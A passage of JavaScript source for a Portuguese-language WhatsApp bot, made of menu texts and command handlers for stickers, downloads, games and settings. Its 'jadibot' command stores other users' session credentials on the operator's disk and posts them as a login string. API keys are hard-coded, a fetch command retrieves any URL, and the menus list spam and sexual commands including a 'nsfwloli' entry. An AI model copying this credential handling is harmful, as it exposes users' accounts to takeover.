⍟ \`\`\`listvn\`\`\`
♔︎ \`\`\`listgp\`\`\`
♡︎ \`\`\`baileys\`\`\`
⍟ \`\`\`q\`\`\`
♔︎ \`\`\`getcaption\`\`\`
♡︎ \`\`\`tospam\`\`\`
⍟ \`\`\`sharelock \`\`\`
♔︎ \`\`\`tomp3 \`\`\`
♡︎ \`\`\`tomp4\`\`\`
⍟ \`\`\`robot \`\`\`
♔︎ \`\`\`balik \`\`\`
♡︎ \`\`\`bass \`\`\`
⍟ \`\`\`gemuk \`\`\`
♕︎\`\`\`detikvn \`\`\`
♡︎ \`\`\`detikvideo \`\`\`
`)
break
case 'stickermenu':
  uptime = process.uptime();
const timestam6 = speed();
const lateskk0 = speed() - timestam6
  var grpukk0 = edward.chats.array.filter(v => v.jid.endsWith('g.us'))
reply(`
    🄱🄴🄼 🅅🄸🄽🄳🄾 🄰🄾 🄼🄴🄽🅄 
               🅂🅃🄸🄲🄺🄴🅁 :)


✰ \`\`\`Prefixo: *\`\`\`
✰ \`\`\`Total Grupos : ${grpukk0.length}\`\`\`
✰ \`\`\`Velocidade : ${lateskk0.toFixed(4)} Segundos\`\`\`
✰ \`\`\`Runtime : ${kyun(uptime)}\`\`\`


♕ ︎\`\`\`figu [ _marque img/gif/vídeo_ ]\`\`\`
♧︎ ︎︎\`\`\`figu512 [ _marque img/gif/vídeo_ ]\`\`\`
♔ ︎\`\`\`circle [ _marque img_ ]\`\`\`
♕ \`\`\`figutrigger [ _marque img_ ]\`\`\`
♧ \`\`\`figuwasted [ _marque img_ ]\`\`\`
♔ \`\`\`figugay [ _marque img_ ]\`\`\`
♕ \`\`\`fcomunista [ _marque img_ ]\`\`\`
♧ \`\`\`farma [ _marque img_ ]\`\`\`
♔ \`\`\`fcomunista [ _marque img_ ]\`\`\`
♕ \`\`\`fcomunista [ _marque img_ ]\`\`\`
♧ \`\`\`fcomunista [ _marque img_ ]\`\`\`
♔ \`\`\`figusrc [ _marque img_ ]\`\`\`
♕ \`\`\`figuloli [ _marque img_ ]\`\`\`
♧ \`\`\`figuneko  [ _marque img_ ]\`\`\`
♔ \`\`\`figublut [ _marque img_ ]\`\`\`
♕ \`\`\`figuinvertido [ _marque img_ ]\`\`\`
♧ \`\`\`figusepia [ _marque img_ ]\`\`\`
♔ \`\`\`figudc  [ _marque img_ ]\`\`\`
♕ \`\`\`figudcb  [ _marque img_ ]\`\`\`
♧ \`\`\`figuovo  [ _marque img_ ]\`\`\`
♔ \`\`\`figuanime [ _marque img_ ]\`\`\`
♕ \`\`\`stickerwm [ _nome|author_ ]\`\`\`
♧ \`\`\`renomear [ _nome|author_ ]\`\`\`
♔ \`\`\`colong [ _marque sticker_ ]\`\`\`
♕ \`\`\`dado\`\`\`
♧ \`\`\`emoji_app [ _❤️_ ]\`\`\`
♔ \`\`\`emoji_mi [ _❤️_ ]\`\`\`
♕ \`\`\`emoji_wa [ _❤️_ ]\`\`\`
♧ \`\`\`emoji_fb [ _❤️_ ]\`\`\`
♔ \`\`\`emoji_go [ _❤️_ ]\`\`\`
♕ \`\`\`emoji_lg [ _❤️_ ]\`\`\`
♧ \`\`\`emoji_ht [ _❤️_ ]\`\`\`
♔ \`\`\`emoji_mo [ _❤️_ ]\`\`\`
♕ \`\`\`emoji_tw [ _❤️_ ]\`\`\`
♧ \`\`\`emoji_sa [ _❤️_ ]\`\`\`
♔ \`\`\`emoji_pi [ _❤️_ ]\`\`\`
♕ \`\`\`emoji_op [ _❤️_ ]\`\`\`
♧ \`\`\`attp \`\`\`
♔ \`\`\`toimg [ _marque sticker_ ]\`\`\`
♕ \`\`\`tovid [ _marque sticker_ ]`)
break
case 'hentaimenu':
  uptime = process.uptime();
const timestam7 = speed();
  const lateskkg = speed() - timestam7
  var grpukkg = edward.chats.array.filter(v => v.jid.endsWith('g.us'))
reply(`🄱🄴🄼 🅅🄸🄽🄳🄾 🄰🄾 🄼🄴🄽🅄 
              🄷🄴🄽🅃🄰🄸 :)


✰ \`\`\`Prefixo: *\`\`\`
✰ \`\`\`Total Grupos : ${grpukkg.length}\`\`\`
✰ \`\`\`Velocidade : ${lateskkg.toFixed(4)} Segundos\`\`\`
✰\`\`\`Runtime : ${kyun(uptime)}\`\`\`


♫ \`\`\`nsfwloli \`\`\`
☾ ︎\`\`\`nsfwneko \`\`\`
✞ ︎\`\`\`ahegao \`\`\`
♫ \`\`\`ass \`\`\`
☾ ︎\`\`\`bdsm \`\`\`
✞ ︎\`\`\`blowjob \`\`\`
♫ \`\`\`cuckold \`\`\`
☾ ︎\`\`\`cum \`\`\`
✞ ︎\`\`\`ero \`\`\`
♫ \`\`\`femdom \`\`\`
☾ ︎\`\`\`foot \`\`\`
✞ ︎\`\`\`gangbang \`\`\`
♫ \`\`\`glasses \`\`\`
✞ ︎\`\`\`hentai \`\`\`
☾ ︎\`\`\`jahy \`\`\`
♫ \`\`\`masturbation \`\`\`
✞ \`\`\`wallpaper18\`\`\``)
break
case'menuinterativo':
  uptime = process.uptime();
const timestam8 = speed();
  const latesknk = speed() - timestam8
  var grpuknk = edward.chats.array.filter(v => v.jid.endsWith('g.us'))
reply(`
    🄱🄴🄼 🅅🄸🄽🄳🄾 🄰🄾 🄼🄴🄽🅄 
        🄸🄽🅃🄴🅁🄰🅃🄸🅅🄾 :)


✰ \`\`\`Prefixo: *\`\`\`
✰ \`\`\`Total Grupos : ${grpuknk.length}\`\`\`
✰ \`\`\`Velocidade : ${latesknk.toFixed(4)} Segundos\`\`\`
✰\`\`\`Runtime : ${kyun(uptime)}\`\`\`

 ❒ 「 \`\`\`MENU INTERATIVO\`\`\` 」

❦ ︎\`\`\`topgay\`\`\`
☽ ︎\`\`\`gostosas\`\`\`
♫ ︎\`\`\`rankfofo\`\`\`
❦ ︎\`\`\`rankfeio\`\`\`
☾ ︎\`\`\`topgado\`\`\`
♫ ︎\`\`\`gay\`\`\`
❦ ︎\`\`\`pau\`\`\`
☽ ︎\`\`\`gostosa\`\`\`
♫ ︎\`\`\`linda\`\`\`
❦︎ \`\`\`detectordegostosa\`\`\`
☽︎ \`\`\`abraço\`\`\`
♫︎ \`\`\`beijo\`\`\`
❦︎ \`\`\`chute\`\`\`
☽︎ \`\`\`carinho\`\`\`
♫︎ \`\`\`tapa\`\`\`
❦︎ \`\`\`ship\`\`\`
☾︎ \`\`\`tapanaraba\`\`\`
 `)
break
case 'gamemenu':
  uptime = process.uptime();
const timestam9 = speed();
const lateskzk = speed() - timestam9
  var grpukzk = edward.chats.array.filter(v => v.jid.endsWith('g.us'))
reply(`
    🄱🄴🄼 🅅🄸🄽🄳🄾 🄰🄾 🄼🄴🄽🅄 
              🄶🄰🄼🄴🅂 :)


✰ \`\`\`Prefixo: *\`\`\`
✰ \`\`\`Total Grupos : ${grpukzk.length}\`\`\`
✰ \`\`\`Velocidade : ${lateskzk.toFixed(4)} Segundos\`\`\`
✰\`\`\`Runtime : ${kyun(uptime)}\`\`\`


♔ ︎\`\`\`caracoroa\`\`\`
♧ ︎︎︎︎\`\`\`morte\`\`\`
♕ ︎\`\`\`rip\`\`\`
♔ \`\`\`chance\`\`\`
♧ \`\`\`roleta\`\`\`
♕ \`\`\`roletarussa\`\`\`
♔ \`\`\`sn\`\`\`
♧ \`\`\`gadometro\`\`\`
♕ \`\`\`dinheiro\`\`\`
♔ \`\`\`ttt [ _easy/normal/hard/impossible_ ]\`\`\`
♧ \`\`\`jogodavelha [ _@tag_ ]\`\`\`
♕ \`\`\`anagrama [_botão_]\`\`\`
♔ \`\`\`delttt\`\`\`
♧ \`\`\`slots\`\`\`
♕ \`\`\`ppt [_tesoura/pedra/papel_]\`\`\`
`)
break
case 'jadibot':
edward.version = [2, 2119, 6]
edward.browserDescription = ['Bruno Akame','Desktop','3.0']
if (args[0] && args[0].length > 200) {
	let json = Buffer.from(args[0], 'base64').toString('utf-8')
    let obj = JSON.parse(json)
    await edward.loadAuthInfo(obj)
}
try {
edward.on('qr' ,async qr => {
qrbot = await qrkode.toDataURL(qr, { scale: 8 })
buffqr = await Buffer.from(qrbot.split('data:image/png;base64,')[1], 'base64')
await fs.writeFileSync(`./jadibot@${sender}.jpg`, buffqr)
let scen = await edward.sendMessage(from, fs.readFileSync(`./jadibot@${sender}.jpg`), MessageType.image, {quoted : mek,caption: 'Leia o QR Para se conectar com o bot!\n\nEste QR irá expira daqui 20 segundos'})    
setTimeout(() => {
       edward.deleteMessage(from, scen.key)
  }, 30000);
})  
edward.on ('open', async () => {
  console.log ('credentials update')
  const authInfo = edward.base64EncodedAuthInfo()
  fs.writeFileSync(`./db/cachê/jadibot/${sender}.json`, JSON.stringify(authInfo  ,null, '\t'))
  await edward.sendMessage('0@s.whatsapp.net', `Você pode fazer o login sem qr com a mensagem abaixo`, MessageType.extendedText)
  edward.sendMessage('0@s.whatsapp.net', `${prefix}${command} ${Buffer.from(JSON.stringify(authInfo)).toString('base64')}`, MessageType.extendedText)
})
edward.on('chat-update', async (chat) => {
	require('./edward.js')(client, chat)
})    
await edward.connect().then(async ({user}) => {
reply('Conectado com sucesso ao WhatsApp.\n*NOTA: É apenas um passeio*\n' + JSON.stringify(user, null, 2))
})
} catch {
reply('Erro!  apenas 1 pessoa pode acessar o recurso Jadibot')
}
break
case 'stopjadibot':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
try {
reply('ok')
fs.unlinkSync(`./db/cachê/jadibot/${sender}.json`)
edward.close()
} catch {
reply('ok')
edward.close()
}
break
case 'addcmd': 
case 'setcmd':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (isQuotedSticker) {
if (!c) return reply(`Use assim : ${command} cmd e marcar o adesivo`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, c)
reply("Pronto")
} else {
reply('marque a figurinha')
}
break
case 'delcmd':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./db/outros_db/scommand.json', JSON.stringify(scommand))
reply("O cmd foi deletado...")
break
case 'listcmd':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
let teksnyee = `\`\`\`「 LISTA CMD STIC 」\`\`\``
let cemde = [];
for (let i of scommand) {
cemde.push(i.id)
teksnyee += `\n\n*❏ ID :* ${i.id}\n*❏ Cmd :* ${i.chats}`
}
reply(teksnyee)
break
				case 'script':
		case 'sc':
		case 'github':
		edward.sendMessage(from, { text: `${github}`, matchedText: `${github}`, description: "", title: "não clique aqui !!!", jpegThumbnail: pperfil }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
       case 'debug':
			 res = await edward.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Olá ${pushname} 👋,\n\n${jmn} - ${week} - ${calender}`,
							"hydratedFooterText": `${NomeBot}`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
edward.relayWAMessage(res)
break
case 'debug2':
   res = await edward.prepareMessageFromContent(from,{
"templateMessage": {
  "hydratedFourRowTemplate": {
    "hydratedContentText": "",
    "hydratedFooterText": "",
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": "",
          "url": ""
        },
        "index": 0
      }
    ]
  },
  "hydratedTemplate": {
    "hydratedContentText": `olá ${pushname} 👋,\n\n${jmn} - ${week} - ${calender}`,
    "hydratedFooterText": `${NomeBot}`,
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": `Script ${NomeBot}`,
          "url": `${github}`
        },
        "index": 0
      }
    ]
  }
}
}, {})
edward.relayWAMessage(res)
break
  case 'ig':
case 'igdl':
case 'instagram':
if (!c) return reply('Cadê o link??')
var { igDownloader } = require('./funções/igdown')
   res = await igDownloader(`${c}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
                    break
case 'tiktokdl':
case 'tkdl':
 if (args.length == 0) return reply(`Exemplo: ${prefix + command} _link do vídeo do tiktok_`)
link = args.join(" ")
reply(`Estou fazendo 🤠`)
anu = await fetchJson(`https://akame-api.herokuapp.com/api/tkdl?link=${link}&apikey=edwardbot22`)
resultadov = await getBuffer(anu.resultado.videosemwm)
resultadoi = await getBuffer(anu.imageUrl)
edward.sendMessage(from, resultadov, video, {quoted: mek, caption: `Prontinho 🤠`})
//edward.sendMessage(from, buffer2, image, {caption: `Thumb`, quoted: mek, thumbnail: null})
break
case 'imgtourl': case 'tourl':                                
var encmidia  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
var jnckk = await  edward.downloadAndSaveMediaMessage(encmidia)
var imgbb = require('imgbb-uploader')
imgbb('3b8594f4cb11895f4084291bc655e510', jnckk)
.then(data => {
var caps = `╭─「 IMAGEM PARA LINK 」\n│\n│• ID : ${data.id}\n│• Tipo : ${data.image.mime}\n│• Extensão : ${data.image.extension}\n│\n│• LINK : ${data.display_url}\n╰─────────────────────`
ibb = fs.readFileSync(jnckk)
edward.sendMessage(from, ibb, image, {quoted: mek,caption: caps, thumbnail: null})
})
.catch(err => {
throw err 
})
break
       case 'tourl2':
               if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
               reply(mess.wait)
               boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               owgi = await edward.downloadMediaMessage(boij)
               res = await uploadImages(owgi)
               reply(res)
               } else {
               reply('Marque img/video')
}
               break
case 'viewonce':
	if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await edward.downloadMediaMessage(encmedia)				
							edward.sendMessage(from, buff, image, { viewOnce:true, caption: `${c}`})			
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await edward.downloadMediaMessage(encmedia)				
							edward.sendMessage(from, buff, video, { viewOnce:true, caption: `${c}`})						
							}
break
case 'pinterest2':
if (!c) return reply('O que você está procurando?')
pinterest(`${c}`).then( data => {
const amsulah = data.result
const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
sendMediaURL (from ,pimterest , `Pinterest : ${c}`)
})
break

case 'isbaileys': 
case 'bail': 
case 'baileys':
reply(`${mek.quoted.isBaileys}`)
break
case 'getcaption':
 if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
 boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}}
break
case 'q': 
    if (!m.quoted) return reply('marque a msg!')
    let qse = edward.serializeM(await m.getQuotedObj())
    if (!qse.quoted) return reply('está msg não contem uma resposta!')
    await qse.quoted.copyNForward(m.chat, true)
break
case 'listgroup': 
case 'grouplist': 
case 'listgp':
case 'listagp':
case 'listagrupos':
const txs = edward.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`
❉─────────────────────❉
• *🔖Nome* : ${edward.getName(v.jid)}
• *🛡️ID do Grupo : ${v.jid}*
• *🏮Estado* : ${v.read_only ? 'Lido' : 'Não lido'}
❉─────────────────────❉`).join`\n\n`
reply('≡ *LISTA DE GRUPOS*\n\n' + txs)
break
case 'pvlist': 
case 'listpv': 
case 'listaprivado':
case 'privadolista':
case 'listprivado':
const pv = edward.chats.privat().filter(v => v.jid.endsWith('g.us')).map(v =>`
❉─────────────────────❉
• *🔖Nome* : ${edward.getName(v.jid)}
• *🛡️ID : ${v.jid}*
• *🏮Estado* : ${v.read_only ? 'Lido' : 'Não lido'}
❉─────────────────────❉`).join`\n\n`
reply('≡ *LISTA DO PV*\n\n' + pv)
break
  case 'caripesan':
  case 'pesquisamsg':
if (args.length < 1) return reply(`Use assim ${prefix + command} olá|15`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return reply('máximo 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
cok = await edward.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Mensagem não encontrada!') 
if (cok.messages.length < parseInt(batas)) reply(`Hanya ditemukan ${cok.messages.length - 1} Pesan`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
edward.sendMessage(from, `Nih pesannya!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
return reply(mess.error.api)
}
} else {
reply(`Use assim ${prefix + command} Olá|15`)
}
break
  case 'get':
case 'fetch':
            if(!c) return reply('Link?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            reply(bu)
            })   
            break
            case 'autorespon':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
           if (c === 'on'){
              autorespon = true
                    reply(`Resposta autômatica foi ativada com sucesso`)
                } else if (c === 'off'){
                    autorespon = false
                    reply(`Resposta autômatica foi desativada com sucesso`)
                      	} else if (!c) {
sendButMessage(
from,
`🗣️ AUTO RESPOSTA 🗣️🏻️`,
`Selecione abaixo`,
[
{
buttonId: `autorespon on`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `autorespon off`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
                break
                case 'antidelete':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Use assim: ${prefix + command} on/off`)
           if (c === 'on'){
             antidelete = true
                    reply(`Modo ${command} foi ativado com sucesso`)
                } else if (c === 'off'){
                    antidelete = false
                    reply(`Modo ${command} foi ativado com sucesso`)
                } else {
                    reply(mess.error.api)
                }
                break
                case 'autoler':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Use assim: ${prefix + command} on/off`)
           if (c === 'on'){
             autoread = true
                    reply(`Modo ${command} foi ativado com sucesso`)
                } else if (c === 'off'){
                    autoread = false
                    reply(`Modo ${command} foi desativado com sucesso`)
                } else {
                    reply(mess.error.api)
                }
                break
                case 'autoescrever':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
           if (c === 'on'){
             autocomposing = true
                    reply(`Modo ${command} foi ativado com sucesso`)
                } else if (c === 'off'){
                    autocomposing = false
                    reply(`Modo ${command} foi desativado com sucesso`)
            	} else if (!c) {
sendButMessage(
from,
`📛 AUTO LER ✍🏻️`,
`Selecione abaixo`,
[
{
buttonId: `autoescrever on`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `autoescrever off`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break
                case 'autoplay':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
           if (c === 'on'){
             autoplay = true
                    reply(`Modo ${command} foi ativado com sucesso`)
                } else if (c === 'off'){
                    autoplay = false
                    reply(`Modo ${command} foi desativado com sucesso`)
            	} else if (!c) {
sendButMessage(
from,
`🎵 AUTO PLAY 🎶🏻️`,
`Selecione abaixo`,
[
{
buttonId: `autoplay on`,
buttonText: {
displayText: `ONLINE 🤠`,
},
type: 1,
},
{
buttonId: `autoplay off`,
buttonText: {
displayText: `OFFLINE  💔`,
},
type: 1,
},
]
);
}
break
                case 'fakevn':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Use assim: ${prefix + command} on/off`)
           if (c === 'on'){
             autorecording = true
                    reply(`Modo ${command} foi ativado com sucesso`)
                } else if (c === 'off'){
                    autorecording = false
                    reply(`Modo ${command} foi desativado com sucesso`)
                } else {
                    reply(mess.error.api)
                }
                break
                case 'setprefix':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
       if (args.length < 1) return reply(`Insira o prefixo\nOpções :\n=> multi\n=> nopref\n=> prefindvidual`)
           if (c === 'multi'){
              multi = true
                    reply(`O prefix foi mudado para : ${c}`)
                } else if (c === 'nopref'){
                    multi = false
                    nopref = true
                    reply(`O prefix foi mudado para : ${c}`)
                } else if (c === 'prefindvidual'){
                    multi = false
                    nopref = false
                    prefa = `${c}`
                    reply(`O prefix foi mudado para : ${c}`)
                }
                break
        case 'test':
				case 'cek':
				case 'tes':
				runtime = process.uptime()
				reply(`- Online!\n${waktu(runtime)}`)
				break
				case 'tictactoe':
case 'jogodavelha':
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('Marque *"@"* o seu oponente ⚔️')
if (isTTT) return reply('Há um jogo neste grupo, por favor aguarde até o jogo acabar ⏰')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque *"@"* o seu oponente ⚔️!')
ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
player1 = sender
player2 = ment[0]
angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
id = from
gilir = player2
ky_ttt.push({player1,player2,id,angka,gilir})
edward.sendMessage(from, `*🎳 Iniciando O Jogo Da Velha 🎲*

[@${player2.split('@')[0]}] Você está sendo desafiado🔥
Use Y/N Para aceitar, ou correr do desafio...

Nota: use ${prefix}delttt , Para resetar o jogo da velha no grupo, caso o player não responder...!`, text, {contextInfo: {mentionedJid: [player2]}})
break
                case 'delttt':
                case 'delttc':
if (!isGroup) return reply(mess.only.group)
if (!isTTT) return reply('Não há jogos neste grupo')
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa 
reply('Game da velha foi resetado neste grupo ☕')
break
				case 'getpp':
					anu = from
		if (`${anu}@s.whatsapp.net`) {
		try {
					ppimg = await edward.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				ano = await edward.getProfilePicture(anu)
				buffer = await getBuffer(ano)
				edward.sendMessage(from, buffer, image, {quoted: mek})
		} else {
		}
			  break
case 'ttt':

if (!isGroup) {
reply(`esse game e so para grupos`)
} else if (tttset.tttstatus == "on") {
reply(`Alguém já está jogando no momento\nPor favor aguarde um instante...`)
} else if (tttset.waitingTime == "on") {
reply(`Alguém jogou recentemente\nPor favor aguarde o tempo de espera de 4 minutos...`)
} else if (args == 0 || (args != 'easy' && args != 'Easy' && args != 'EASY' && args != 'normal' && args != 'Normal' && args != 'NORMAL' && args != 'hard' && args != 'Hard' && args != 'HARD'&& args != 'impossible'&& args != 'Impossible' && args != 'IMPOSSIBLE')) {
sendButMessage(
from,
`🔵 JOGO DA VELHA _*IA*_ 🏓`,
`Selecione abaixo`,
[
{
buttonId: `ttt easy`,
buttonText: {
displayText: `🟢 MODO FÁCIL 🟢`,
},
type: 1,
},
{
buttonId: `ttt normal`,
buttonText: {
displayText: `🟡 MODO NORMAL 🟡`,
},
type: 1,
},
{
buttonId: `ttt hard`,
buttonText: {
displayText: `🔴 MODO HARD 🔴`,
},
type: 1,
},
]
);
} else {
tttset.tttstatus = "on"
tttset.player = sender
tttset.playerName = pushname
tttset.mentionPlayer = mek
tttset.local = from
if (args == 'easy' || args == 'Easy' || args == 'EASY') {
tttset.tttdifficulty = "EASY"
} else if (args == 'normal' || args == 'Normal' || args == 'NORMAL') {
tttset.tttdifficulty = "NORMAL"
} else if (args == 'hard' || args == 'Hard' || args == 'HARD') {
tttset.tttdifficulty = "HARD"
} else if (args == 'impossible' || args == 'Impossible' || args == 'IMPOSSIBLE') {
tttset.tttdifficulty = "IMPOSSIBLE"
}
const randomStartIA = Math.floor(Math.random() * 3)
if (randomStartIA == 0) {
IA()
tttset.reActivate1 = "on"	
}
tttf = `JOGO DA VELHA MODO ${tttset.tttdifficulty}`
costum(`O jogo começou!!!\nModo: ${tttset.tttdifficulty}`, text, tescuk, tttf)
edward.sendMessage(from, `🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`,text )
edward.sendMessage(from,`Caso não saiba como jogar digite: ${prefix}ttthelp`, text) 
setTimeout( () => {
tttset.waitingTime = "off"
tttset.autoEndTime = "on"
}, 240000) //4 minutos
}
//await limitAdd(sender)
break
case 'ttthelp':
edward.sendMessage(from, ttthelp(prefix), text)
//await limitAdd(sender)
break
case 'tttme':
if (!isGroup) return reply(`esse game e so para grupos`)
const checkTTTIdMe = getTTTId(sender)
if (checkTTTIdMe === undefined) addTTTId(sender)
edward.sendMessage(from, tttme(pushname, getTTTwins(sender), getTTTdefeats(sender), getTTTties(sender), getTTTpoints(sender)), text, {quoted:mek})
//await limitAdd(sender)
break
case 'tttrank':
if (!isGroup) return reply(`esse game e so para grupos`)
//if (tictactoe2.length < 3) return reply(`Humm, é necessário que no mínimo 3 pessoas tenham jogado...`)
tictactoe2.sort((a, b) => (a.points < b.points) ? 1 : -1)
mentioned_jid = []
let board = '【 TTT RANKS 】\n\n'
try {
for (let i = 0; i < 3; i++) {
if (i == 0) {board += `${i + 1}º 🥇 : @${tictactoe2[i].jid.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ Vitórias: ${tictactoe2[i].wins} 🎊\n│ ➣ Derrotas: ${tictactoe2[i].defeats} 💥\n│ ➣ Empates: ${tictactoe2[i].ties} 🌀\n│ ➣ Pontos: ${tictactoe2[i].points} ✨\n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
} else if (i == 1) {board += `${i + 1}º 🥈 : @${tictactoe2[i].jid.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ Vitórias: ${tictactoe2[i].wins} 🎊\n│ ➣ Derrotas: ${tictactoe2[i].defeats} 💥\n│ ➣ Empates: ${tictactoe2[i].ties} 🌀\n│ ➣ Pontos: ${tictactoe2[i].points} ✨\n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
} else if (i == 2) {board += `${i + 1}º 🥉 : @${tictactoe2[i].jid.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ Vitórias: ${tictactoe2[i].wins} 🎊\n│ ➣ Derrotas: ${tictactoe2[i].defeats} 💥\n│ ➣ Empates: ${tictactoe2[i].ties} 🌀\n│ ➣ Pontos: ${tictactoe2[i].points} ✨\n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
}
mentioned_jid.push(tictactoe2[i].jid)
} 
mentions(board, mentioned_jid, true)
} catch (err) {
console.log(err)
await edward.sendMessage(from, `Humm, é necessário que no mínimo 3 pessoas tenham jogado...`, text, {quoted: mek})
}
//await limitAdd(sender)
break
case 'coord' :
tttset.playertest = sender
if (!isGroup) {
reply(`esse game e so para grupos`)
} else if (tttset.tttstatus == "off") {
reply(`Você ainda não iniciou o jogo\nDigite ${prefix}ttt [DIFICULDADE] para iniciar`)
} else if (tttset.player != tttset.playertest) {
reply(`Alguém já está jogando no momento\nPor favor aguarde um instante...`)
} else if (tttset.tttantibug == "on") {
reply(`Aguarde a ação anterior ser concluída...`)
} else {
tttset.tttantibug = "on"
const coordX = args
if (coordX != 'a1' && coordX != 'a2' && coordX != 'a3' &&
coordX != 'b1' && coordX != 'b2' && coordX != 'b3' &&
coordX != 'c1' && coordX != 'c2' && coordX != 'c3') {
reply(`Digite o comando com uma coordenada\nExemplo: ${prefix}coord a1`)
tttset.tttantibug = "off"
} else {
switch (args[0]) {
case 'a1':
if (esp.a1 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.a1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
//await limitAdd(sender)
break
case 'a2':
if (esp.a2 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.a2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
//await limitAdd(sender)
break
case 'a3':
if (esp.a3 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.a3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
//await limitAdd(sender)
break
case 'b1':
if (esp.b1 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.b1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
//await limitAdd(sender)
break
case 'b2':
if (esp.b2 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.b2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
//await limitAdd(sender)
break
case 'b3':
if (esp.b3 != "🔲") {
reply('O espaço já foi ocupado\nTente outra coordenada')
} else {
esp.b3 = "❌"
